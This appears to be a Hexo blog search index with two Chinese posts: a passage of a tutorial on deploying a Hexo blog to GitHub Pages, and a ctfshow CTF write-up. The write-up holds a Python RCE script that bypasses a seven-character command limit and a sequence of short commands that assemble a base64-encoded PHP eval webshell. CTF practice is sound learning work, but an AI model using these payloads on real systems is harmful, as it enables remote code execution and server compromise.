title="开始配置主题"></a>开始配置主题</h3><ul><li><p>在博客目录下有一个名字叫：<code>_config.yml</code> 的文件，我们将他打开</p><img src="https://s1.328888.xyz/2022/03/21/953E0.png" heigth="80%" width="80%"></li><li><p>然后滑到下面找到<code>theme</code>进行修改，修改成<strong>你刚刚下载的到博客目录下的themes下的主题文件夹名字</strong></p><img src="https://s1.328888.xyz/2022/03/21/95bCk.png" heigth="80%" width="80%"></li><li><p>改好就可以暂时预览你刚刚下载的主题了，在你的博客目录下打开<code>Git bash</code> 执行以下命令</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><ul><li>执行完你可以看到一个网址，切记不可以使用<code>ctrl + c</code>进行复制哦~ ~ </li><li>我们可以选择那串链接用鼠标右键选择<code>copy</code>进行复制，使用<code>ctrl + c</code>会结束预览的哦<img src="https://s1.328888.xyz/2022/03/21/95jd3.png" heigth="80%" width="80%"></li></ul><blockquote><p>有些主题你更换后无法预览，但是会提示你说，你需要安装什么什么。你就需要去安装哦，一般来说大部分都是pug和其他的插件。具体需要根据你的主题到底是需要哪个再去下载哦。总的来说，你预览的时候一般都会给你一个下载的链接，告诉你需要去安装这个，安装结束就可以暂时预览你的博客效果了，如果不懂的话可以评论，我看见会帮助你。</p></blockquote><h3 id="开始修改主题"><a href="#开始修改主题" class="headerlink" title="开始修改主题"></a>开始修改主题</h3><blockquote><p>首先你会看见在你的博客根目录下有一个<code>_config.yml</code>，然后你又在你的博客目录下的<strong>themes</strong>又看见一个一模一样的<code>_config.yml</code>。他们两个虽然名字是一样的，但是你千万千万别弄混了。</p></blockquote><ul><li><p>博客根目录下的<code>_config.yml</code></p></li><li><p>主题themes下的<code>_config.yml</code><br>你要学会分清楚。</p></li><li><p>我们来看一下博客根目录下的<code>_config.yml</code>里面有啥东东</p></li><li><p>首先映入眼帘的就是以下这个东西，我已经贴心为英语不好的宝打了注释。</p><img src="https://s1.328888.xyz/2022/03/21/9WiFA.png" heigth="80%" width="80%"></li><li><p>再然后我们来看看主题themes下的<code>_config.yml</code>里面又有啥东东</p></li><li><p>首先打开第一眼看到的就是以下可能会出现的东西，里面就是主题详细配置以及注释（虽然可能是英文，但是你可以用翻译）</p><img src="https://s1.328888.xyz/2022/03/21/9WhPv.png" heigth="60%" width="60%"></li></ul><blockquote><p>是不是感觉一下子就能区分这两个<code>_config.yml</code>（如果没有那就熟能生巧吧！）</p></blockquote><ul><li><p><strong>具体的配置主题的话我就简单介绍，大部分都在主题themes下的<code>_config.yml</code>进行修改</strong></p></li><li><p>以下为简单的hexo命令</p></li><li><p>创建一个新文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;我的第一个博客&quot;</span><br></pre></td></tr></table></figure></li><li><p>创建完每次生成的文章都固定在你的博客根目录下面的source/_posts下</p><img src="https://s1.328888.xyz/2022/03/21/9WlfW.png" heigth="80%" width="80%"></li></ul><blockquote><blockquote><p>小提示：生成的 <code>.md</code> 文件就是你的博客，你可以在博客根目录下面的source/_posts下找到并打开编辑。<br>你打开之后不会弄咋办？？看完我博客——————有手就行。</p></blockquote></blockquote><img src="https://s1.328888.xyz/2022/03/21/9WITT.png" height="70%" width="70%"><h2 id="部署与发布"><a href="#部署与发布" class="headerlink" title="部署与发布"></a>部署与发布</h2><h3 id="生成博客文章"><a href="#生成博客文章" class="headerlink" title="生成博客文章"></a>生成博客文章</h3><ul><li>我们生成的博客的文章 <code>.md</code> 文件，稍微百度一下发现这个是 <strong>Markdown</strong> 那就去<a href="https://www.runoob.com/markdown/md-tutorial.html">菜鸟教程</a>学习一下<strong>Markdown</strong><br>稍微学习一下就可以轻松发布博客了。<blockquote><p>编写工具自行百度就可以轻松找到，我使用的是<strong>Visual Studio Code</strong></p></blockquote></li></ul><h3 id="使用github部署博客"><a href="#使用github部署博客" class="headerlink" title="使用github部署博客"></a>使用github部署博客</h3><blockquote><p>这边我比较喜欢git部署，就以这个为例子吧，其他的gitee和glahub等其他部署也会陆续更新</p></blockquote><ul><li><p>登录我们的github账号</p><blockquote><p>（没有就注册一个,因为是外网所以你可能访问有点慢）</p></blockquote></li><li><p>新建一个仓库</p><img src="https://s1.328888.xyz/2022/03/24/9MK61.png" height="90%" width="90%"></li><li><p>仓库名必须是 <code>用户名 + .github.io </code></p><img src="https://s1.328888.xyz/2022/03/24/9MZPA.png" height="90%" width="90%"></li></ul><h3 id="创建git密钥"><a href="#创建git密钥" class="headerlink" title="创建git密钥"></a>创建git密钥</h3><ul><li><p>接下来我们需要创建<code>Git</code>密钥,打开git bash（不要求在哪个目录),执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;你的邮箱&quot;</span><br></pre></td></tr></table></figure><blockquote><p>执行上面那条命令不管出现什么都是确定即可，比如会提示你：【Y/N】，你需要输入Y，然后没有的直接回车确认</p></blockquote></li><li><p>再执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>会输出你密钥，你需要复制下来。<br>生成的地址在 <code>.shh</code> 中的 <code>id_rsa.pub</code> 中：</p><img src="https://s1.328888.xyz/2022/03/24/9MMMi.png" height="90%" width="90%"></li><li><p>回到我们的github点击我们的头像进入，再点击左边 <code>Settings--SSH</code> 和右边 <code>New SSH Key</code></p><img src="https://s1.328888.xyz/2022/03/24/9MSXv.png" height="90%" width="90%"></li></ul><p><code>title</code> 随便取都可以，<code>key</code> 把你的密钥粘贴进去  然后点击<code>Add SSH key</code> 即可</p><blockquote><p>如果你换电脑了 也是需要再重新生成密钥进行绑定哦~</p></blockquote><h3 id="链接git准备部署"><a href="#链接git准备部署" class="headerlink" title="链接git准备部署"></a>链接git准备部署</h3><ul><li><p>接下来我们打开<code>Git bash</code> 执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果成功连接就会提示以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? </span><br></pre></td></tr></table></figure><p>你输入 <strong>yes</strong> 即可</p><blockquote><p>如果你一直连接报错 <strong>Error</strong>与<strong>time out</strong>，请你使用一下加速器或者梯子<br>当你成功时候会提示：<code>helo TTRR,you are successful*******</code></p></blockquote></li><li><p>打开我们的创建好的项目选择<code>ssh</code> 并复制下来等会会使用到</p><img src="https://s1.328888.xyz/2022/03/24/9Nuhd.png" height="90%" width="90%"></li><li><p>打开我们博客根目录的<code>_config.yml</code> 滑倒最底下就可以看到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: 你复制的地址</span><br><span class="line">  branch: mian</span><br></pre></td></tr></table></figure></li><li><p>接下来我们再我们博客根目录下来执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;你的github用户名&quot;</span><br><span class="line">git config --global user.email &quot;你注册github的邮箱&quot;</span><br></pre></td></tr></table></figure><p>然后执行以下命令安装上传插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><blockquote><p>一般安装上传插件都不会报错<code>Error</code>,要是你报错了，再次执行即可，如果你反反复复都无法安装 或者一直报错就在加我QQ我会帮助你</p></blockquote></li></ul><h3 id="部署博客"><a href="#部署博客" class="headerlink" title="部署博客"></a>部署博客</h3><ul><li>完成以上所有步骤后进行最后的部署上传，执行以下命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><img src="https://s1.328888.xyz/2022/03/24/9NUPk.png" height="90%" width="90%"></li></ul><h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><h3 id="生成博客链接"><a href="#生成博客链接" class="headerlink" title="生成博客链接"></a>生成博客链接</h3><ul><li><p>打开我们的博客项目点击<code>Settings</code></p><img src="https://s1.328888.xyz/2022/03/24/9NyTQ.png" height="90%" width="90%"></li><li><p>往下滑找到<code>Github pages</code></p><img src="https://s1.328888.xyz/2022/03/24/9NGM3.png" height="90%" width="90%"></li><li><p>选择分支为<code>main</code> 然后保存</p><img src="https://s1.328888.xyz/2022/03/24/9N9f4.png" height="90%" width="90%"></li></ul><h2 id="最后我们就能得到我们的博客链接啦！！"><a href="#最后我们就能得到我们的博客链接啦！！" class="headerlink" title="最后我们就能得到我们的博客链接啦！！"></a>最后我们就能得到我们的博客链接啦！！</h2><p>有什么不懂的可以评论哦~</p><hr>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 个人心得 </tag>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow七夕杯签到</title>
      <link href="/2022/02/19/%C2%96CTFshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E7%AD%BE%E5%88%B0%E7%BB%84/"/>
      <url>/2022/02/19/%C2%96CTFshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E7%AD%BE%E5%88%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p><em><strong>欢迎来到TTRR blog，本篇分享的是我CTF做题过程的个人心得wp</strong></em></p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><h3 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h3><p>在末尾处我们发现了js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isSafe</span>(<span class="params">cmd</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> cmd.<span class="property">length</span>&lt;=<span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不难判断长度限制为七位</span></span><br></pre></td></tr></table></figure><p>执行py脚本RCE</p><blockquote><p>注释为个人理解</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e51a220b-8df4-45fa-a1d0-6d7f9f693e59.challenge.ctf.show/&quot;</span>  <span class="comment"># 需要自行替换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getShell</span>(<span class="params">payload</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    file = &#123;</span><br><span class="line">        <span class="string">&quot;file&quot;</span>: <span class="string">b&quot;#!/bin/sh\ncat /f*&gt;/var/www/html/1.txt&quot;</span></span><br><span class="line">    &#125;  <span class="comment"># 这个是可执行所以要加#！不然会报错,后面跟着指定的目录 然后/n换行，cat就是打印 f*匹配f开头的文件 然后打印所有f开头的文件</span></span><br><span class="line">    <span class="comment"># 重定向到这里/var/www/html/1.txt。这个/var/www/html/1.txt是linux默认网站存在的一个目录</span></span><br><span class="line">    <span class="comment"># 这里的#！后面要指定绝对路径，因为它是不会自动到&amp;PATH中寻找解释器</span></span><br><span class="line">    response = requests.post(url=url + <span class="string">&quot;api/tools.php&quot;</span>, files=file, data=data)  <span class="comment"># 这里的requests.post是要传入了（. /t*/*）参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;t*&quot;</span> <span class="keyword">in</span> response.text:  <span class="comment"># 判断传入的参数（. /t*/*）也由于没有成功</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;执行成功，检查回显...&quot;</span>)  <span class="comment"># 成功提示这句话</span></span><br><span class="line">    response = requests.get(url=url + <span class="string">&quot;1.txt&quot;</span>)  <span class="comment"># 这句话的意思是获取1.txt内容</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  <span class="comment"># 如果我们上传参数（. /t*/*）成功，并且访问网页+1.txt响应为200....(200的意思就是正常访问成功)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag 获取成功 &quot;</span> + response.text)  <span class="comment"># 访问成功后返回内容，这个内容包含了flag，所有我们打印出来就可以看见</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag 获取失败&quot;</span>)  <span class="comment"># 如果不是响应不是200代表失败即告诉你flag获取失败</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():  <span class="comment"># 定义函数run（）执行下面代码</span></span><br><span class="line">    getShell(<span class="string">&quot;. /t*/*&quot;</span>)  <span class="comment"># 代码的意思是把目录所有文件当sh执行，执行的话就会记录下flag并回显</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  <span class="comment"># 这是一个模块具体可以查文档有说明</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>还有应该办法就是一个个输入框内执行，详情如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>需要理解这道题的精华就是七字符限制rce，这种题我也解释不出个所以然，但是可以参考ctfshow哔哩哔哩</p></blockquote><iframe height="500px" width="100%" src="//player.bilibili.com/player.html?aid=896536576&cid=719143574&page=1&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts" alt="ctfshow官方视频" title="点击放大">> CTFshow视频</iframe><h2 id="CRYPTO签到"><a href="#CRYPTO签到" class="headerlink" title="CRYPTO签到"></a>CRYPTO签到</h2><h3 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">大牛在今年的hvv过程中，渗透进某业务系统，发现了密文,可是不知道如何解出明文，你能帮他找出来吗？</span><br><span class="line"></span><br><span class="line">已知密文由两部分组成，后面的推测为秘钥</span><br><span class="line"></span><br><span class="line">密文如下：</span><br><span class="line"></span><br><span class="line">y3rmc2hvd3tjcnlwdg9fc2lnbmlux2lzx2vhc3l9-a0004008a0</span><br></pre></td></tr></table></figure><h3 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h3><blockquote><p>密文：<br>y3rmc2hvd3tjcnlwdg9fc2lnbmlux2lzx2vhc3l9<br>后面跟着的可能是密钥<br>为什么这么说呢？</p></blockquote><img src="https://s1.328888.xyz/2022/09/18/oeULy.png" alt="整串无法解密" title="点击放大"><img src="https://s1.328888.xyz/2022/09/18/orEQi.png" alt="去掉后面可以解密" title="点击放大"><p>但是解密结果有问题<strong>�z�show{crypv_signin�is�k�sy}</strong><br>我们运行一下ciphey试试看其他的</p><blockquote><p>啊哈哈 我电脑出了点毛病还没安装ciphey等我明天安装好 再次更新吧</p></blockquote><h2 id="OSINT签到"><a href="#OSINT签到" class="headerlink" title="OSINT签到"></a>OSINT签到</h2><h2 id="RE签到"><a href="#RE签到" class="headerlink" title="RE签到"></a>RE签到</h2><h2 id="MISC签到"><a href="#MISC签到" class="headerlink" title="MISC签到"></a>MISC签到</h2><h2 id="PWN签到"><a href="#PWN签到" class="headerlink" title="PWN签到"></a>PWN签到</h2>]]></content>
      
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
